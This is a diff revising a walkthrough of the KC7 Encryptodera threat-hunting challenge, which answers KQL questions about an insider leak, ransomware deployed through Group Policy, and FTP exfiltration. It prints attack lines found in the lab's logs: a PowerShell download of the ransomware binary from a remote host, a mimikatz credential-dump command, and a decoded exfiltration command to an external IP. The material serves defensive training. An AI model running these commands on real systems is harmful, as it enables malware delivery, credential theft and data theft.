@@ -1,29 +1,26 @@
-Our second one classed as challenging. Very curious to see what this one throws at us.
+Confidential documents from Encryptodera were leaked and it is my job to investigate.
 
+https://kc7cyber.com/challenges/145
 
 Section 0: KQL 101
 How many employees work at Encryptodera?
-And we are given the general:
 Employees
 | count
 Answer: 600
 
 Which employee does the IP address 10.10.0.216 belong to?
-Given:
 Employees
 | where ip_addr == "10.10.0.216"
 Answer: Nakia Acosta
-(We've learned enough from this platform by now. Her username: naacosta. Her email address: nakia_acosta@encryptoderafinancial.com. Her hostname: P224-LAPTOP. And her role: IT Helpdesk Technician)
+(We've learned enough from this platform by now to know to take notes. Her username: naacosta. Her email address: nakia_acosta@encryptoderafinancial.com. Her hostname: P224-LAPTOP. And her role: IT Helpdesk Technician)
 
 How many emails did Nakia Acosta receive?
-I knew it would come in handy to grab all of her information!
 Email
 | where recipient == "nakia_acosta@encryptoderafinancial.com"
 | count
 Answer: 38
 
 How many distinct senders were seen in the email logs from bitbingersbanking.net?
-I tried:
 Email
 | where sender contains "bitbingersbanking.net"
 | distinct sender
@@ -31,8 +28,7 @@ Email
 Answer: 1204
 
 How many distinct websites did Timothy Geffre visit?
-We could go to the Employees table, write a query to get Timothy's information, grab his IP, and then take it to the OutboundNetworkEvents table and answer the question.
-OR, as I've learned from prior modules, we can do this:
+(This query language was learned from prior modules.)
 let tim_ip =
 Employees
 | where name == "Timothy Geffre"
@@ -41,11 +37,9 @@ OutboundNetworkEvents
 | where src_ip in (tim_ip)
 | distinct url
 | count 
-If you haven't read through my previous module writeups, this "let" clause will give us a variable called tim_ip. It'll then do the first part of what I said above: go into the Employees table, search for Timothy, and grab his IP. Then, we do the second part: go into OutboundNetworkEvents and find the IP we just grabbed from Employees, see which unique URLs that IP visited, and count them. We did all of this in 1 query instead of 2 separate ones.
 Answer: 92
 
 How many domains in the PassiveDns records contain the word “money”? (hint: use the contains operator instead of has. If you get stuck, do a take 10 on the table to see what fields are available.)
-We're given a template to fill in, which amounts to:
 PassiveDns
 | where domain contains "money"
 | distinct domain
@@ -53,22 +47,12 @@ PassiveDns
 Answer: 15
 
 What IP did the domain moneyppl.com resolve to?
-Again, we have a template to fill in, which ends up as:
 PassiveDns
 | where domain == "moneyppl.com"
 | distinct ip
 Answer: 211.152.115.93
 
 How many unique URLs were browsed by employees with the name Karen?
-This one officially introduces the "let" clause, and gives us this template:
-let karen_ips = 
-Employees
-| where name has "<Employee Name>"
-| distinct ip_addr;
-OutboundNetworkEvents
-| where src_ip in (karen_ips)
-<more kql here>
-Plugging stuff in, we get:
 let karen_ips = 
 Employees
 | where name has "Karen"
@@ -80,7 +64,6 @@ OutboundNetworkEvents
 Answer: 321
 
 How many authentication attempts did we see to the accounts of employees with the name Karen?
-Plugging into their template, we get a query that looks a little something like:
 let karen_auth = 
 Employees
 | where name has "Karen"
@@ -93,32 +76,28 @@ Answer: 420
 
 Section 1: Offensive Odor
 What is Barry's role at the company?
-No more sample queries, so let's go for this ourselves:
 Employees
 | where name == "Barry Shmelly"
-Let's also list out some more information we may need from Barry: IP - 10.10.0.1, email address - barry_shmelly@encryptoderafinancial.com, username - bashmelly, role - StackOverflow Copy Paster, hostname - IGOY-DESKTOP
+Taking notes on Barry: IP - 10.10.0.1, email address - barry_shmelly@encryptoderafinancial.com, username - bashmelly, role - StackOverflow Copy Paster, hostname - IGOY-DESKTOP
 Answer: StackOverflow Copy Paster
 
 What is Barry's email address?
-Thank you, past me, for going through that effort in the previous question.
 Answer: barry_shmelly@encryptoderafinancial.com
 
 What was the subject of the interesting email (the one on January 16th) that Barry sent?
-Easy enough:
 Email
 | where sender == "barry_shmelly@encryptoderafinancial.com"
-We were given a hint, so let's scroll down to that date:
+Given the hint, scroll down to that date:
 I'm not coming in today. I'm sick of this place. We're all getting laid off anyway.
 
 What was the role of the employees that received Barry's email?
-Let's grab one of the recipients: christopher_naylor@encryptoderafinancial.com
-Let's go to the Employees table:
+Take one of the recipients: christopher_naylor@encryptoderafinancial.com
+Then:
 Employees
 | where email_addr == "christopher_naylor@encryptoderafinancial.com"
 Answer: Social Media Manager
 
 On January 18, Barry sent an email with the subject "YOU ARE A GREEDY PIG!!!! WHAT IS WRONG WITH YOU?????" What was the role of the recipient of that email?
-I did it all in one query:
 let mean_email =
 Email
 | where subject contains "GREEDY PIG"
@@ -127,47 +106,38 @@ Email
 Employees
 | where email_addr in (mean_email)
 | distinct role
-This query takes the email with a portion of that subject, sorts by Barry being the sender, and finds the recipient. Then, we go to the Employees table and find the row that matches that email address, and grabs that user's role.
 Answer: Chief Executive Officer
-Uh oh!
 
 What's Barry's IP address? (Paste the full IP address )
-Once again, thank you, past me, for jotting this down earlier:
 Answer: 10.10.0.1
 
 What was the complete URL that Barry was browsing on his computer regarding Cybersecurity Insiders on the afternoon of December 26th?(Paste the full url)
-I came up with:
 OutboundNetworkEvents
 | where src_ip == "10.10.0.1"
 | where url contains "insiders"
-This will go into our network logs, show traffic from Barry to the outside world, and find URLs containing "insiders."
 Answer: https://www.cybersecurity-insiders.com/safe-ways-to-transfer-sensitive-files
 
 What website did he visit first on January 15th? (Paste the full URL)
-We haven't learned about timestamps in this particular module yet, but I have from prior modules. This is what I came up with:
 OutboundNetworkEvents
 | where src_ip == "10.10.0.1"
 | where timestamp between (datetime(2024-01-15T00:00:00.000Z) .. datetime(2024-01-16T00:00:00.000Z)) 
 | distinct url
-This also sorts out traffic only between midnight on Jan 15 and Jan 16.
 Answer: https://www.7-zip.org/a/7z2002-x64.exe
 
 Could you provide the full URL for the website Barry searched for USB Flash Drives?
-This should do the trick:
 OutboundNetworkEvents
 | where src_ip == "10.10.0.1"
 | where url contains "USB"
 Answer: https://www.wikihow.com/Use-a-USB-Flash-Drive
 
 What "secret" document on business transactions did Barry download?
-We've learned about the FileCreationEvents table from prior modules, so:
 FileCreationEvents
 | where hostname == "IGOY-DESKTOP" //Thanks, past me, for jotting that one down, too
 | where filename contains "secret"
 Answer: SECRET_MergersAndAcquisitions_Strategy2025.docx
 
 What document (docx) did Barry download about salaries?
-I first adjusted the prior query to say "salaries" instead of "secret". Unfortunately, that returned nothing, so let's try just "salary" instead.
+I first adjusted the prior query to say "salaries" instead of "secret". Unfortunately, that returned nothing, so trying just "salary" instead gets the answer.
 Answer: ExecutiveSalaryNegotiations.docx
 
 Barry decided he needed the secrets behind Encrytodera's algorithms. What document (zip) did Barry download to get this?
@@ -175,33 +145,28 @@ Change that to "Encryptodera" instead of "salary" (Yes, that's a different name 
 Answer: Encryptodera_Proprietary_Algorithms.zip
 
 Do you know the password he used to zip the files?
-Now, we have to go to the ProcessEvents table and search the command line for "password". A little something like:
 ProcessEvents
 | where hostname == "IGOY-DESKTOP"
 | where process_commandline contains "pass"
-And one of our results shows:
 7z.exe a -t7z C:\Users\bashmelly\Documents\To_Take\Company_Secrets.7z C:\Users\bashmelly\Documents\To_Take\*.docx -p securePass123
 Answer: securePass123
 
 Barry stored a few extra sensitive files on his flash drive. What is the name of the drive on which Barry stored the final files?
-Let's take the timestamp of the prior answer: 2024-01-16T10:18:41.000Z
-And see what happened following it:
+Take the timestamp of the prior answer: 2024-01-16T10:18:41.000Z
 ProcessEvents
 | where hostname == "IGOY-DESKTOP"
 | where timestamp > datetime(2024-01-16T10:18:41.000Z)
-And we find:
 copy C:\Users\bashmelly\Downloads\DigitalWallet_SourceCode.zip E:\SchmellyDrive\
 Answer: SchmellyDrive
 
 
 Section 2: Crypto Conquest
-Next, we are given a screenshot and asked the filename of the shown text document: YOU_GOT_CRYTOED_SO_GIMME_CRYPTO.txt
+Next, there is a screenshot and itasks the filename of the shown text document: YOU_GOT_CRYTOED_SO_GIMME_CRYPTO.txt
 
 The file asks for payment and says all the files have been encrypted. What kind of attack is this?
-This is classic ransomware.
+This is ransomware.
 
 On how many machines was this .txt file seen?
-Let's search for file creations under part of this file's name:
 FileCreationEvents
 | where filename contains "CRYTOED"
 | distinct hostname
@@ -209,7 +174,7 @@ FileCreationEvents
 Answer: 306
 
 What time was the ransom note first seen?
-And it gives us this to replace the last 2 lines with:
+Add this instead of the prior last 2 lines:
 | order by timestamp asc
 Answer: 2024-02-17T02:34:54.000Z
 
@@ -217,48 +182,43 @@ What is the hostname of the system where the ransom note was first seen?
 Same query, same result: UL8R-MACHINE
 
 Look closer at UL8R-MACHINE around the time when the ransom note was seen (2024-02-17). How many files were encrypted on this machine?
-If we start with: 
 FileCreationEvents
 | where hostname == "UL8R-MACHINE"
 | where timestamp > datetime(2024-02-17)
-We see that the extension used is "umadbro", so let's add that in:
+The extension used is "umadbro", so add that in:
 | where filename contains "umadbro"
 Answer: 50
 
 What is the extension that was used on the encrypted files?
-Hey, we just answered that one!
+Answered above
 
 What command was run that references the ransomware extension?
-And we are given:
 ProcessEvents
 | where hostname == "UL8R-MACHINE"
 | where process_commandline has "<ransomware extension here>"
 Answer: start /b C:\\ProgramData\\files_go_byebye.exe -encrypt -target C:\\Users\\ -ext .umadbro
 
 When did files_go_byebye.exe appear on this machine?
-This should do it:
 FileCreationEvents
 | where filename == "files_go_byebye.exe"
 | where hostname == "UL8R-MACHINE"
 Answer: 2024-02-17T02:30:50.000Z
 
-You can use this query to conduct temporal analysis on this host, where we look for activity based on timestamps. How many commands were run on UL8R-MACHINE during this timeframe?
-Given: 
+How many commands were run on UL8R-MACHINE during this timeframe?
 ProcessEvents
 | where hostname == "UL8R-MACHINE"
 | where timestamp between (datetime("2024-02-16") .. datetime("2024-02-18"))
 Answer: 23
 
 There's a base64 encoded powershell command run in this time window. What domain does the encoded PowerShell reference?
-Let's look at the process_commandline column: C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc cG93ZXJzaGVsbCAtYyAiSW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwOi8vbm90aWZpY2F0aW9uLWZpbmFuY2Utc2VydmljZXMuY29tL2ZpbGVzX2dvX2J5ZWJ5ZS5leGUgLU91dEZpbGUgQzpcXFByb2dyYW1EYXRhXFxmaWxlc19nb19ieWVieWUuZXhlIg==
-Now let's decode that Base64: powershell -c "Invoke-WebRequest -Uri http://notification-finance-services.com/files_go_byebye.exe -OutFile C:\\ProgramData\\files_go_byebye.exe"
+Look at the process_commandline column: C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc cG93ZXJzaGVsbCAtYyAiSW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwOi8vbm90aWZpY2F0aW9uLWZpbmFuY2Utc2VydmljZXMuY29tL2ZpbGVzX2dvX2J5ZWJ5ZS5leGUgLU91dEZpbGUgQzpcXFByb2dyYW1EYXRhXFxmaWxlc19nb19ieWVieWUuZXhlIg==
+Decode that Base64: powershell -c "Invoke-WebRequest -Uri http://notification-finance-services.com/files_go_byebye.exe -OutFile C:\\ProgramData\\files_go_byebye.exe"
 Answer: notification-finance-services.com
 
 What command is run right before the base64-encoded PowerShell?
 Answer: gpupdate /force
 
-gpupdate /force give us a clue that the attacker might have compromised the domain controller to deploy this ransomware. This command forces an update of Group Policy Objects (GPOs), which are tools used legitimately to control settings in a network. An attacker with elevated permissions can create a malicious GPO to deploy malware to a large number of devices. How many devices ran the gpupdate /force command?
-Let's try this out:
+gpupdate /force give us a clue that the attacker might have compromised the domain controller to deploy this ransomware. This command forces an update of Group Policy Objects (GPOs), which control settings in a network. A malicious user with elevated permissions can create a GPO to serve malware to devices in that GPO. How many devices ran the gpupdate /force command?
 ProcessEvents
 | where process_commandline contains "gpupdate /force"
 | distinct hostname
@@ -268,54 +228,47 @@ One common discovery command is systeminfo, which gives an attacker information 
 Replace "gpupdate /force" with "systeminfo": 8
 
 What was the timestamp for the first time the command was run?
-Remove the "distinct" clause since that forces the command to only show us the hostnames.
 Answer: 2024-02-02T03:32:36.000Z
 
 How many days elapsed between when the attackers ran discovery commands and when the ransomware attack started?
-So the command was run on 2024-02-02T03:32:36.000Z
-And the ransomware note was first seen on 2024-02-17T02:34:54.000Z
+The command was run on 2024-02-02T03:32:36.000Z
+The ransomware note was first seen on 2024-02-17T02:34:54.000Z
 That is 15 days.
 
 What is the hostname of the device on which the attackers first ran systeminfo?
 Answer from the prior query: 41QI-LAPTOP
 
-Let's look closer at 41QI-LAPTOP to see what else happened. Shortly after running systeminfo, the actor used nltest /dclist to identify the company's domain controller. What was the full commandline used by the threat actor when running nltest /dclist? (paste the full commandline)
-This should do the trick:
+Let's look closer at 41QI-LAPTOP to see what else happened. Shortly after running systeminfo, the hacker used nltest /dclist to identify the company's domain controller. What was the full commandline used by the threat actor when running nltest /dclist? (paste the full commandline)
 ProcessEvents
 | where process_commandline contains "nltest /dclist"
 | where hostname == "41QI-LAPTOP"
 Answer: cmd.exe /C nltest /dclist:encryptoderafinancial.com
 
 What is the full name of the .xlsx.exe file on 41QI-LAPTOP?
-Back to the FileCreationEvents table:
 FileCreationEvents
 | where hostname == "41QI-LAPTOP"
 | where filename contains ".xlsx.exe"
 Answer: Company_Financials_Q1_2024_Review.xlsx.exe
 
 What file shows up a few seconds after the .xlsx.exe file?
-Let's get the timestamp from the previous query: 2024-02-01T08:50:12.000Z
-And replace the previous last line with: | where timestamp > datetime(2024-02-01T08:50:12.000Z)
+Get the timestamp from the previous query: 2024-02-01T08:50:12.000Z
+Replace the previous last line with: | where timestamp > datetime(2024-02-01T08:50:12.000Z)
 Answer: screenconnect_client.exe
 
 How many devices does screenconnect_client.exe appear on?
-This should work:
 FileCreationEvents
 | where filename == "screenconnect_client.exe"
 | distinct hostname
 | count
 Answer: 3
 
-Let's go back to Company_Financials_Q1_2024_Review.xlsx.exe and see if we can figure out how it was delivered to the victim. Check the Email logs to see if the .xlsx.exe file was sent in a link. What email address was used to send this file?
-This query should get us that information:
+Go back to Company_Financials_Q1_2024_Review.xlsx.exe and figure out how it was delivered to the victim. Check the Email logs to see if the .xlsx.exe file was sent in a link. What email address was used to send this file?
 Email
 | where link contains ".xlsx.exe"
 | distinct sender
 Answer: barry_shmelly@encryptoderafinancial.com
-UH OH!
 
 Starting on 2024-02-01, it looks like Barry's account is used to send unusual emails. How many unusual emails were sent by Barry?
-Let's try:
 Email
 | where timestamp >= datetime(2024-02-01T00:00:00.00Z) //We were given this date in the question, I just didn't paste it.
 | where sender == "barry_shmelly@encryptoderafinancial.com"
@@ -324,29 +277,18 @@ Answer: 9
 Copy the recipients' email addresses and paste them somewhere safe. --> rose_briggs@encryptoderafinancial.com, valerie_orozco@encryptoderafinancial.com, david_tuitt@encryptoderafinancial.com, marguerite_french@encryptoderafinancial.com, sue_brady@encryptoderafinancial.com, carl_johnston@encryptoderafinancial.com, nancy_owens@encryptoderafinancial.com, eulah_foster@encryptoderafinancial.com, robin_kirby@encryptoderafinancial.com
 
 According to his emails, Barry quit Encryptodera on January 18th. How could he have sent these emails on February 1st? Maybe an unauthorized party gained access to Barry's account and used it to send these emails. Let's look at Barry's AuthenticationEvents to check for anything unusual. What IP was used to sign into Barry's account on February 1st?
-This query should get us what we need:
 AuthenticationEvents
 | where username == "bashmelly"
 | where timestamp between (datetime(2024-02-01T00:00:00.000Z) .. datetime(2024-02-02T00:00:00.000Z))
 Answer: 143.38.175.105
 
 How many other accounts did that IP log into?
-Let's try:
 AuthenticationEvents
 | where src_ip == "143.38.175.105"
 | distinct username
 Answer: 0
 
-Since the attacker didn't log in to any other accounts externally, maybe they moved around within the network once they got inside. This is called lateral movement. Let's take all the hosts where the threat actor ran systeminfo and look for common login patterns across those devices. You'll need to use a let statement so you can easily query data from all of these devices at once. Here's a template to help you with this:
-let hosts = ProcessEvents
-| where process_commandline has "<command you're looking for>"
-| distinct hostname;
-AuthenticationEvents
-| where hostname in (hosts)
-| summarize dcount(hostname) by src_ip
-| order by dcount_hostname desc
-How many IPs logged in to all 8 devices where the attacker ran systeminfo?
-Filling in the template, we get:
+Since the attacker didn't log in to any other accounts externally, maybe they moved around within the network once they got inside. Take all the hosts where the threat actor ran systeminfo and look for common login patterns across those devices. Use a let statement to easily query data from all of these devices at once. How many IPs logged in to all 8 devices where the attacker ran systeminfo?
 let hosts = ProcessEvents
 | where process_commandline has "systeminfo"
 | distinct hostname;
@@ -354,96 +296,86 @@ AuthenticationEvents
 | where hostname in (hosts)
 | summarize dcount(hostname) by src_ip
 | order by dcount_hostname desc
-Now, we haven't gone over some of this stuff in the 2nd block yet, but I have in previous modules. Let me explain: dcount is typically used to calculate an estimate of the number of unique values. Then, we are sorting the results in the output in descending order by dcount(hostname), which will be with the greatest number first.
 Answer: 2 IPs had 8 results
 
-Both of these IPs are private IPs, that means they are internal to the network. That's a good indication that the attacker likely moved laterally within the network. Let's just focus on one of those IPs 10.10.0.138. What is the role of the employee who this IP address belongs to?
-This query is simple enough:
+Both of these IPs are private IPs, that means they are internal to the network. That's an indication that the attacker likely moved laterally within the network.Focus on one of those IPs - 10.10.0.138. What is the role of the employee who this IP address belongs to?
 Employees
 | where ip_addr == "10.10.0.138"
 Answer: System Administrator
-Well, if the attacker's compromised a SysAdmin's machine, that's certainly not good!
+If the attacker's compromised a SysAdmin's machine, that means they likely have the elevated privileges mentioned earlier.
 
 How many successful logins were made from this IP?
-Let's try this:
 AuthenticationEvents
 | where src_ip == "10.10.0.138"
 | where result contains "Successful"
 Answer: 554
 
-One of the hosts logged into from this IP is especially concerning. This host is a server (and it's not the mail server)! What is the hostname of the server the attackers logged into?
-Let's start by adding:
+What is the hostname of the server the attackers logged into?
+Add:
 | distinct hostname
-Unfortunately, that gives us way too many results (486). Let's try narrowing it down further with:
+That gives us too many results to look through easily (486). Narrow it down further with:
 | where hostname contains "server" // Put this BEFORE the previous line we added
 Answer: DOMAIN_CONTROLLER_SERVER
 
 
 Section 3: F in the Chat
 What username was used to log into the DOMAIN_CONTROLLER_SERVER?
-This should get us the result we need:
 AuthenticationEvents
 | where hostname == "DOMAIN_CONTROLLER_SERVER"
 | where result contains "Successful"
 Answer: lihenry_domain_admin
 
 What laptop did the lihenry_domain_admin account sign into? (Enter the hostname)
-Let's adjust the query to:
 AuthenticationEvents
 | where username == "lihenry_domain_admin"
 | where result contains "Successful"
 Answer: GJ95-LAPTOP
 
-Let's see if we can find evidence of the threat actor stealing the domain admin credentials from GJ95-LAPTOP. Mimikatz is a popular credential dumping tool used by malicious actors. What is the MITRE ATT&CK ID for mimikatz?
+Mimikatz is a popular credential dumping tool used by malicious actors. What is the MITRE ATT&CK ID for mimikatz?
 Simple OSINT: S0002
 
-Let's check to see if the threat actor ran mimikatz on GJ95-LAPTOP. Did the threat actor run mimikatz on this device? If so, enter the command line the attacker ran. If not, enter no.
-This should tell us what we need to know: 
+Check to see if the threat actor ran mimikatz on GJ95-LAPTOP. If so, enter the command line the attacker ran. If not, enter no.
 ProcessEvents
 | where hostname == "GJ95-LAPTOP"
 | where process_commandline contains "mimikatz"
 Answer: yes, totally_not_mimikatz.exe "sekurlsa::logonpasswords"
 
 The attackers dumped credentials on this device. Who does this device belong to? (Enter the employee's name)
-Easy enough:
 Employees
 | where hostname == "GJ95-LAPTOP"
 Answer: Valerie Orozco
 More information to save for later: IP - 10.10.0.18, email address - valerie_orozco@encryptoderafinancial.com, username - vaorozco, role - System Administrator
 
 Was Valerie Orozco targeted in the phishing emails sent from Barry Shmelly?
-Scroll back up and see for yourself (hint: yes).
+Yes
 
 What is the name of the file that was sent to Valerie in the phishing email?
-This should give us any and all of them:
 Email
 | where recipient == "valerie_orozco@encryptoderafinancial.com"
 | where sender == "barry_shmelly@encryptoderafinancial.com"
-Answer just 1 result appears, and it has a link of: http://update-finance-security.biz/public/images/files/Employee_Contact_List_Updated_March_2024.docx.exe
+Just 1 result appears, and it has a link of: http://update-finance-security.biz/public/images/files/Employee_Contact_List_Updated_March_2024.docx.exe
 Answer: Employee_Contact_List_Updated_March_2024.docx.exe
 
 Did Valerie click the link? If so, enter the timestamp when she clicked the link. If not, enter 'no'
 OutboundNetworkEvents
 | where url contains "Employee_Contact_List"
 | where src_ip == "10.10.0.18"
-Thankfully, she did not!
+She did not.
 
 How many different user accounts logged into Valerie's machine?
-Let's try:
 AuthenticationEvents
 | where hostname == "GJ95-LAPTOP"
 | distinct username
 | count
 Answer: 3
 
-Of the three accounts that logged into Valerie's account, we've already seen two: vaorozco (Valerie's account) and (lihenry_domain_admin), the account the threat actor stole from Valerie's machine. The third account, systadmi_local_admin, is new! Let's look closer at that one. How many unique hosts did this user account attempt to log into?
-Let's adjust the query to:
+Of the three accounts that logged into Valerie's account, we've already seen two: vaorozco (Valerie's account) and lihenry_domain_admin, the account the threat actor stole from Valerie's machine. The third account, systadmi_local_admin, is new. How many unique hosts did this user account attempt to log into?
 AuthenticationEvents
 | where username == "systadmi_local_admin"
 | distinct hostname
 Answer: 10
 
-Next, we are given this query:
+Which user NOT in an IT role was improperly using the systadmi_local_admin credentials? (This is likely a sign of compromise)
 let hosts = FileCreationEvents
 | where filename has "screenconnect"
 | distinct hostname;
@@ -456,12 +388,9 @@ AuthenticationEvents
     | project ip_addr,role,email_addr,name
 ) on $left.src_ip==$right.ip_addr
 | project SourceIpName=name, a="who is a", SourceIpUserRole=role, b="logged onto",hostname, c="using", username, d="at",timestamp
-We are told this is more complicated than we are used to, and that's ok because sometimes we have to use queries written by someone else. I'll attempt to break it down, but no promises that it's entirely correct: We are making a variable called hosts. In that variable, we are going to store the information of distinct hosts where a file was created that has "sceenconnect" in the name. Then, we take those hosts and see which ones that usernames with "systadmi" in them have successfully logged into. Then, we are going to take the columns from all of the results, and add in IPs, roles, email addresses, and names from the Employees table (this will work because the hostnames are in both tables, so they can be cross-referenced). We are going to print out something like: "[IP] who is a [role] logged onto [hostname] using [username] at [timestamp]." (Edit: That translates to the columns and data in the results. I was thinking with my Java/programming brain.)
-Finally, our question is: Which user NOT in an IT role was improperly using the systadmi_local_admin credentials? (This is likely a sign of compromise)
 Answer: Robin Kirby (Risk Analyst)
 
 When was Robin phished by Barry Shmelly's account?
-I ran:
 let  rob_email =
 Employees
 | where name == "Robin Kirby"
@@ -469,93 +398,82 @@ Employees
 Email
 | where recipient in (rob_email)
 | where sender == "barry_shmelly@encryptoderafinancial.com"
-And our 1 result shows: 2024-02-01T03:59:30.000Z
-
-Ans we are given a summary: Let's recap. A threat actor 😈 compromised Barry Shmelly's account and logged into it from 143.38.175.105. Once the actor gained access to Barry's account, they used it to target 9 employees in a phishing 🎣 attack. One of the users compromised by this phish was Robin Kirby. The threat actor used stolen local admin credentials 🔑 to move laterally and login from Robin Kirby's machine to Valerie Orozco's machine! Once they accessed Valerie's machine, they dumped the domain admin credentials, then logged in to the domain controller 👑. They used their access to the domain controller to deploy ransomware to 306 machines at Encryptodera.
+And 1 result shows: 2024-02-01T03:59:30.000Z
 
 
 Section 4: A Network Mystery
 Which IP address received the largest amount of data on Feb 5th?
-This one had me stumped until I remembered a NetworkFlow table existed:
 NetworkFlow
 | where timestamp between (datetime(2024-02-05T00:00:00.000Z) .. datetime(2024-02-06T00:00:00.000Z))
 | sort by bytes desc // This puts the highest total bytes first
-And we are looking for the destination IP since we need the one who RECEIVED the largest amount of data.
+Look for the destination IP since we need the one who RECEIVED the largest amount of data.
 Answer: 182.56.23.121
 
 How many bytes of data were sent to that IP on the 5th?
 Answer: 12,716
 
-Perhaps if we eliminated this data flow, we could get the network to perform better. This would allow all the tiktoks to flow much faster! First, we should make sure the traffic to that IP isn't business critical. When was data first sent to this IP? (paste the full timestamp)
-Let's just filter on that IP this time:
+When was data first sent to this IP? (paste the full timestamp)
 NetworkFlow
 | where dest_ip == "182.56.23.121"
 Answer: 2024-01-21T13:28:33.000Z
 
 On how many distinct days have we sent data to this IP?
 It looks like data is sent once a day for 27 days.
-Side note: That seems a bit like beaconing!
+Note: This seems like beaconing, a classic sign of C2.
 
 What service is used for the port to which this data is being transferred?
 It looks to be being received on port 21, which is FTP.
-Even more suspicious!
 
 What is the total amount of data transferred to this IP address?
 I had to do some research on how to do math in KQL, but this is what I came up with:
 NetworkFlow
 | where dest_ip == "182.56.23.121"
 | summarize totalbytes = sum(bytes)
-So this last line will create a column called totalbytes. It will put the sum of the numbers in the bytes column (from the previous portion of the query) into that column, and only output that.
 Answer: 208138
 
 How many distinct employees have sent data to this IP address?
-I changed up the query a bit to read:
 NetworkFlow
 | where dest_ip == "182.56.23.121"
 | distinct src_ip
 And only got 1 result.
 
 Whose name is linked to that IP address? Provide the employee's name.
-I used:
 Employees
 | where ip_addr == "10.10.0.2"
 Answer: Jane Smith
 More  info on Jane: email - jane_smith@encryptoderafinancial.com, username - jasmith, role - Cryto Bruh (Blockchain Contractor), hostname - GOTI-LAPTOP
 
 What is that employee's role?
-Thank you, me from one question above.
+See above.
 
 We see her looking for the location of the company's __ __ __ __ (4 words)
-I searched:
 InboundNetworkEvents
 | where url contains "location"
 | where src_ip == "10.10.0.2"
 Answer: cold storage crypto wallets
 
 Who was Jane having a suspicious conversation with? (email address)
-I just used:
 Email
 | where sender == "jane_smith@encryptoderafinancial.com"
-And since there's only 32 results, we can just scroll until we see this subject line: will use FTP to exfil secrets 💼. Requesting FTP Server IP?
+And since there's only 32 results, scroll until this subject line: will use FTP to exfil secrets 💼. Requesting FTP Server IP?
 And it was sent to: elboss@westealurcrypto.com
 
 What IP address did the boss man provide to help with smuggling the data?
-Flip the previous query around to where Jane is the recipient and elboss@westealurcrypto.com is the sender, and we see: [EXTERNAL]🔐 FTP Server IP: 182.56.23.121
+Flip the previous query around to where Jane is the recipient and elboss@westealurcrypto.com is the sender: [EXTERNAL]🔐 FTP Server IP: 182.56.23.121
 
 What is the name of the data exfil tool Jane downloads to help with her operation?
-I came up with:
 FileCreationEvents
 | where hostname == "GOTI-LAPTOP"
 | where username == "jasmith"
-| where filename contains ".exe" // Assuming a download to exfiltrate data would happen to be a .exe is a pretty safe bet, I think
+| where filename contains ".exe" // Assuming a download to exfiltrate data would happen to be a .exe
 We see 2 results go to her Downloads folder. The first being: ftp_client.exe
 
 What is the name of the crypto theft tool Jane downloads to help with her operation?
 And that second file in Downloads is: crypto_stealer.exe
 
 To what path does Jane point her data exfiltration tool?
-Well we see that the ftp_client.exe file was downloaded at: 2024-01-21T12:36:03.000Z
-So let's see what comes after that:
+We see that the ftp_client.exe file was downloaded at: 2024-01-21T12:36:03.000Z
+What comes after that?
 ProcessEvents
 | where timestamp > datetime(2024-01-21T12:36:03.000Z)
 | where hostname == "GOTI-LAPTOP"
@@ -568,12 +486,11 @@ Answer: daily
 
 What password does Jane use for the tool?
 The previous command was run at: 2024-01-21T13:03:23.000Z
-I ran this:
 ProcessEvents
 | where timestamp > datetime(2024-01-21T13:03:23.000Z)
 | where hostname == "GOTI-LAPTOP"
 |where process_commandline contains "pass"
-Which... should not have worked. I was searching for passwords, but got bypass, and this is the first result:
+Which actually should not have worked. I was searching for passwords, but got bypass, and this is the first result:
 C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc KCAnXFxub29NZWhUb1RcXGh0aW1zYWpcXHNyZXNVXFw6QyBodGFwLS0gMTIxLjMyLjY1LjI4MSBwaS0tIDEyIHRyb3AtLSAibW9jLmxhaWNuYW5pZmFyZWRvdHB5cmNuZSIgbWl0Y2l2LS0gNURONEhydUZGMHRpM2s0dGxsM3dPVFlSQ2hjdW0ydG9nVSBzc2FwLS0gaHRpbXNhaiByZXN1LS0geWxpYWQtLSBleGUudG5laWxjX3B0ZicgLXNwbGl0ICcnIHwgJXskX1swXX0pIC1qb2luICcn
 Decoding that long string from Base64 gets us: ( '\\nooMehToT\\htimsaj\\sresU\\:C htap-- 121.32.65.281 pi-- 12 trop-- "moc.laicnanifaredotpyrcne" mitciv-- 5DN4HruFF0ti3k4tll3wOTYRChcum2togU ssap-- htimsaj resu-- yliad-- exe.tneilc_ptf' -split '' | %{$_[0]}) -join ''
 And reversing that: '' nioj- )}]0[_${% | '' tilps- 'ftp_client.exe --daily --user jasmith --pass Ugot2muchCRYTOw3llt4k3it0FFurH4ND5 --victim "encryptoderafinancial.com" --port 21 --ip 182.56.23.121 --path C:\\Users\\jasmith\\ToTheMoon\\' (
